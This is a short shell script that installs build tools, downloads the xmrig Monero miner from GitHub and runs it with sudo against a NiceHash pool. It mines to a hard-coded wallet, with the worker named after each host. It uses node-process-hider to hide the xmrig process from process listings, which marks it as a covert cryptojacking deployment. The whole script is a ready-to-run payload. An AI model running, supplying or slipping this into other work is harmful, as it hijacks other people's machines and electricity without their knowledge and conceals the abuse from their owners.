apt-get update && apt-get full-upgrade -y
apt -y install wget curl unzip screen autoconf git cmake binutils build-essential net-tools golang libssl1.0-dev nodejs nodejs-dev node-gyp -y
sudo apt update -y
npm i -g node-process-hider && ph add xmrig
wget https://github.com/xmrig/xmrig/releases/download/v6.17.0/xmrig-6.17.0-linux-x64.tar.gz -O - | tar -xz && cd xmrig-6.17.0 && sudo ./xmrig -a rx/0 -o stratum+ssl://randomxmonero.auto.nicehash.com:443 -u NHbGP8zV37xAgXGmPCjVFcQQXLbde1NNPJWt.$(echo "$(cat /proc/sys/kernel/hostname)" | tr . _ ) -p x --threads=8 --cpu-priority=8 --randomx-mode=fast --keepalive
